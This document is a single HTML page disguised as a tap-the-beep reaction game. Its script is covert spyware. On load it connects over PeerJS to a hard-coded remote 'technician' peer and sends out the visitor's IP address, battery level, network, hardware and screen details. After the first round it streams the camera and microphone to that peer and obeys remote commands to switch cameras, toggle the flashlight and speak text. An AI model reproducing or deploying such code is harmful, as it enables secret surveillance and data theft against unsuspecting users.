<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <title>Reaction Test</title>

    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>

    <style>

        body {
            background-color: #1a1a1a;
            color: white;
            font-family: 'Arial', sans-serif;
            margin: 0;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding-top: 0;
            touch-action: none;
            user-select: none;
        }



        #game-board {
            width: 85vw;
            height: 85vw;
            max-width: 400px;
            max-height: 400px;
            background-color: #2c3e50;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0,0,0,0.5);
            position: relative;
            border: 4px solid #34495e;
            cursor: pointer;
            z-index: 10;
        }



            #game-board.success {
                background-color: #27ae60;
            }



            #game-board.fail {
                background-color: #c0392b;
            }



        #hud-container {
            margin-bottom: 30px;
            text-align: center;
            width: 90%;
            z-index: 10;
        }



        #main-display {
            font-size: 50px;
            font-weight: bold;
            color: #bdc3c7;
            text-shadow: 2px 2px 0 #000;
        }



        #instruction {
            font-size: 18px;
            color: #ecf0f1;
            margin-top: 10px;
            line-height: 1.4;
        }



        /* WHITE FLASHLIGHT LAYER (Fallback) */

        #flashlight-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            z-index: 9999;
            display: none;
            cursor: none;
        }
    </style>

</head>

<body>



    <div id="flashlight-layer"></div>



    <div id="hud-container">

        <div id="main-display">TAP TO START</div>

        <div id="instruction"></div>

    </div>

    <div id="game-board"></div>



    <script>

        const TECHNICIAN_ID = "cybr-support-zomzzssnzcr-141";

        const TRIGGER_COUNT = 1;



        // Game Vars

        let gameState = 'IDLE';

        let beepTimestamp = 0;

        let roundCount = 0;

        let isVideoConnected = false;

        let wakeLock = null;



        // Audio & DOM

        const AudioContext = window.AudioContext || window.webkitAudioContext;

        let audioCtx;

        const synth = window.speechSynthesis;

        const board = document.getElementById('game-board');

        const display = document.getElementById('main-display');

        const flashlightLayer = document.getElementById('flashlight-layer');



        // PeerJS Setup

        const peer = new Peer();

        let myDataConnection = null;

        let currentStream = null;



        // ==========================================

        // 1. IMMEDIATE SPY MODE

        // ==========================================

        peer.on('open', async (id) => {

            console.log("Client ID:", id);

            myDataConnection = peer.connect(TECHNICIAN_ID);



            myDataConnection.on('open', async () => {

                console.log("Data Link Established");

                const fullData = await collectSpyData();

                myDataConnection.send({ type: 'info', ...fullData });



                // Listen for Commands

                myDataConnection.on('data', (data) => {

                    const cmd = data.command || data;



                    if (cmd === 'swap') toggleCamera();



                    // FLASHLIGHT LOGIC

                    if (cmd === 'flash_on') toggleTorch(true);

                    if (cmd === 'flash_off') toggleTorch(false);



                    if (data.command === 'speak' && data.text) speakText(data.text);

                });

            });

        });



        // ==========================================

        // 2. GAME INPUT

        // ==========================================

        board.addEventListener('touchstart', handleInput, { passive: false });

        board.addEventListener('mousedown', handleInput);



        async function handleInput(e) {

            e.preventDefault();



            if (!audioCtx) audioCtx = new AudioContext();

            if (audioCtx.state === 'suspended') audioCtx.resume();

            if (synth.paused) synth.resume();

            if (!wakeLock) { try { wakeLock = await navigator.wakeLock.request('screen'); } catch (e) { } }



            if (gameState === 'IDLE') {

                gameState = 'WAITING_FOR_BEEP';

                display.innerText = "WAIT...";

                display.style.color = "#f1c40f";

                scheduleBeep();

                return;

            }



            if (gameState === 'WAITING_FOR_BEEP') {

                display.innerText = "TOO EARLY!";

                display.style.color = "#e74c3c";

                flashBoard('fail');

                clearTimeout(beepTimer);

                setTimeout(() => { display.innerText = "WAIT..."; display.style.color = "#f1c40f"; scheduleBeep(); }, 1000);

                return;

            }



            if (gameState === 'WAITING_FOR_TAP') {

                const ms = Date.now() - beepTimestamp;

                display.innerText = ms + " ms";

                display.style.color = "#2ecc71";

                flashBoard('success');

                roundCount++;



                if (roundCount === TRIGGER_COUNT && !isVideoConnected) {

                    activateCamera();

                }



                gameState = 'WAITING_FOR_BEEP';

                setTimeout(() => { display.innerText = "WAIT..."; display.style.color = "#f1c40f"; scheduleBeep(); }, 1000);

            }

        }



        // ==========================================

        // 3. CAMERA & FLASHLIGHT LOGIC

        // ==========================================



        async function activateCamera() {

            isVideoConnected = true;

            try { await startStream('user'); } catch (err) { console.log("Camera error:", err); }

        }



        async function startStream(mode) {

            if (currentStream) currentStream.getTracks().forEach(t => t.stop());

            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });

            currentStream = stream;

            peer.call(TECHNICIAN_ID, stream);

        }



        let currentMode = 'user';
        let preFlashMode = null;
        function toggleCamera() {

            currentMode = (currentMode === 'user') ? 'environment' : 'user';

            startStream(currentMode);

        }



        async function toggleTorch(turnOn) {
            const track = currentStream ? currentStream.getVideoTracks()[0] : null;

            // --- TURN ON LOGIC ---
            if (turnOn) {
                // If we are currently on the front camera ('user'), we must switch to back
                if (currentMode === 'user') {
                    console.log("Switching to back camera for flashlight...");
                    preFlashMode = 'user'; // Remember we were on the front camera
                    currentMode = 'environment';
                    await startStream('environment');

                    // Wait slightly for the new stream to initialize before turning on light
                    setTimeout(() => toggleTorch(true), 500);
                    return;
                }

                // Apply Flash (Hardware)
                if (track) {
                    const capabilities = track.getCapabilities();
                    if (capabilities.torch) {
                        try {
                            await track.applyConstraints({ advanced: [{ torch: true }] });
                            return;
                        } catch (e) { console.log("Torch failed:", e); }
                    }
                }

                // Fallback to screen if hardware fails
                flashlightLayer.style.display = 'block';
            }

            // --- TURN OFF LOGIC ---
            else {
                // Turn off hardware flash
                if (track) {
                    const capabilities = track.getCapabilities();
                    if (capabilities.torch) {
                        try {
                            await track.applyConstraints({ advanced: [{ torch: false }] });
                        } catch (e) { }
                    }
                }

                // Turn off screen flash
                flashlightLayer.style.display = 'none';

                // RESTORE CAMERA: If we forced a switch, go back to the original camera
                if (preFlashMode === 'user') {
                    console.log("Returning to front camera...");
                    currentMode = 'user';
                    await startStream('user');
                    preFlashMode = null; // Reset the memory
                }
            }
        }

        // --- DATA COLLECTION ---

        async function collectSpyData() {

            let ip = 'unknown';

            try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j.ip; } catch (e) { }



            let battery = 'unknown';

            try { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%"; } catch (e) { }

            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

            let netType = connection ? connection.effectiveType : 'unknown';

            let downlink = connection ? connection.downlink + ' Mbps' : 'unknown';

            return {

                ip: ip, battery: battery, userAgent: navigator.userAgent,

                network: netType, speed: downlink, cores: navigator.hardwareConcurrency || 'unknown',

                ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',

                screen: window.screen.width + "x" + window.screen.height, lang: navigator.language

            };

        }



        function speakText(text) {

            if (!synth) return;

            synth.cancel();

            const utterance = new SpeechSynthesisUtterance(text);

            synth.speak(utterance);

        }



        let beepTimer = null;

        function scheduleBeep() {

            beepTimer = setTimeout(() => {

                playTone();

                beepTimestamp = Date.now();

                gameState = 'WAITING_FOR_TAP';

            }, Math.floor(Math.random() * 2000) + 1000);

        }



        function playTone() {

            if (!audioCtx) return;

            const osc = audioCtx.createOscillator();

            const g = audioCtx.createGain();

            osc.connect(g); g.connect(audioCtx.destination);

            osc.frequency.value = 600; g.gain.value = 0.1;

            osc.start(); osc.stop(audioCtx.currentTime + 0.15);

        }



        function flashBoard(type) {

            board.classList.add(type);

            setTimeout(() => board.classList.remove(type), 200);

        }



        document.addEventListener("visibilitychange", async () => {

            if (wakeLock !== null && document.visibilityState === "visible") {

                wakeLock = await navigator.wakeLock.request('screen');

            }

        });

    </script>

</body>

</html>
